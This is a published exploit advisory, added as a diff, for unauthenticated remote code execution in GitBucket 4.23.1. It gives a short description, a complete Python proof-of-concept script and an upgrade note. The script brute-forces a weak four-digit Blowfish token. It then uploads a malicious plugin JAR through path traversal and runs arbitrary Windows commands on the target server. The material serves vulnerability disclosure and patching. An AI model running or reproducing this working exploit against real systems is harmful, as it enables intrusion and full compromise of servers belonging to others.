@@ -1,0 +1,171 @@
+# Exploit Title: GitBucket 4.23.1 Unauthenticated RCE
+# Date: 21-05-2018
+# Software Link: https://github.com/gitbucket/gitbucket
+# Exploit Author: Kacper Szurek
+# Contact: https://twitter.com/KacperSzurek
+# Website: https://security.szurek.pl/
+# Category: remote
+
+1. Description
+ 
+Abusing weak secret token and passing insecure parameter to File function.
+ 
+2. Proof of Concept
+
+import os 
+try:
+	from Crypto.Cipher import Blowfish
+except:
+	print "pip install pycrypto"
+	os._exit(0)
+
+import binascii
+import base64
+import urllib2
+import urllib
+import time
+import sys
+import pickle
+
+print "GitBucket 4.23.1 Unauthenticated RCE"
+print "by Kacper Szurek"
+print "https://security.szurek.pl/"
+
+print "Working only when server is installed on Windows"
+
+def PKCS5Padding(string):
+    byteNum = len(string)
+    packingLength = 8 - byteNum % 8
+    appendage = chr(packingLength) * packingLength
+    return string + appendage
+
+def encrypt(content, key):
+    content = PKCS5Padding(content)
+    cipher = Blowfish.new(key, Blowfish.MODE_ECB)
+    return base64.b64encode(cipher.encrypt(content))
+
+def get_file(git_bucket_url, file, key, expiration_time):
+    payload = "{} {}".format(expiration_time, file)
+    authorization = encrypt(payload, key)
+    url = "{}/git-lfs/aa/bb/{}".format(git_bucket_url, file)
+
+    try:
+        request = urllib2.Request(url)
+        request.add_header("Authorization", authorization)   
+        result = urllib2.urlopen(request).read()
+        return result
+
+    except Exception, e:
+        # If payload is correct and file does not exist, we got error 400
+        if not "Error 500" in e.read():
+            return 'OK'
+
+def put_file(git_bucket_url, file, key, expiration_time, content):
+    payload = "{} {}".format(expiration_time, file)
+    authorization = encrypt(payload, key)
+    url = "{}/git-lfs/aa/bb/{}".format(git_bucket_url, file)
+
+    try:
+        request = urllib2.Request(url, data=content)
+        request.add_header("Authorization", authorization)
+        request.get_method = lambda: 'PUT' 
+        result = urllib2.urlopen(request)
+        return result.getcode() == 200
+        
+    except Exception, e:
+        return None
+
+def send_command(git_bucket_url, command):
+    try:
+        result = urllib2.urlopen("{}/exploit?{}".format(git_bucket_url, urllib.urlencode({'command' : command}))).read()
+        return result
+    except:
+        return None
+
+def pickle_key(url, key):
+    output = open(pickle_path, "wb")
+    pickle.dump({'url' : url, 'key' : key}, output)
+    output.close()
+    print "[+] Key pickled for futher use"
+
+
+def unpickle_key(url):
+    if os.path.isfile(pickle_path):
+        pickled_file = open(pickle_path, "rb")
+        data = pickle.load(pickled_file)
+        pickled_file.close()
+        if data['url'] == url:
+            return data['key']
+    return None
+
+if len(sys.argv) != 3:
+    print "[-] Usage: exploit.py url command"
+    os._exit(0)
+
+
+exploit_jar = 'exploit.jar'
+url = sys.argv[1]
+command = sys.argv[2]
+pickle_path = 'gitbucket.pickle'
+
+if url.endswith('/'):
+    url = url[0:-1]
+
+try:
+    is_gitbucket = urllib2.urlopen("{}/api/v3/".format(url), timeout=5).read()
+except:
+    is_gitbucket = ""
+
+if not is_gitbucket.startswith('{"rate_limit_url"'):
+    print "[-] Probably not gitbucket url: {}".format(url)
+    os._exit(0)
+
+if not os.path.isfile(exploit_jar):
+    print "[-] Missing exploit file: {}".format(exploit_jar)
+    os._exit(0)
+
+expiration_time = int(round(time.time() * 1000))+(1000*6000)
+print "[+] Set expire time to: {}".format(expiration_time)
+
+print "[+] Start search blowfish key: "
+for i in range(0, 10000):
+    if i % 100 == 0:
+        print "+",
+
+    potential_key = unpickle_key(url)
+    if potential_key:
+        print "\n[+] Unpickle key, try it"
+    else:
+        potential_key = str(i).zfill(4)
+
+    config_path = "non_existing_file"
+    config_content = get_file(url, config_path, potential_key, expiration_time)
+    if config_content:
+        print "\n[+] Found blowfish key: {}".format(potential_key)
+        print "[+] Config content:\n{}".format(config_content)
+
+        exploit_path = "..\..\..\..\plugins\exploit.jar"
+        f = open(exploit_jar, "rb")
+        exploit_content = f.read()
+        f.close()
+        if put_file(url, exploit_path, potential_key, expiration_time, exploit_content):
+            print "[+] Wait few second for plugin load"
+            time.sleep(5)
+            command_content = send_command(url, "cmd /c {}".format(command))
+
+            if command_content:            
+                    pickle_key(url, potential_key)
+                    print command_content
+            else:
+                print "[-] Cannot execute command"
+            
+        else:
+            print "[-] Cannot upload exploit.jar"
+        
+        os._exit(0)
+
+3. Solution:
+  
+Update to version 4.24.1
+  
+https://github.com/gitbucket/gitbucket/releases/download/4.24.1/gitbucket.war
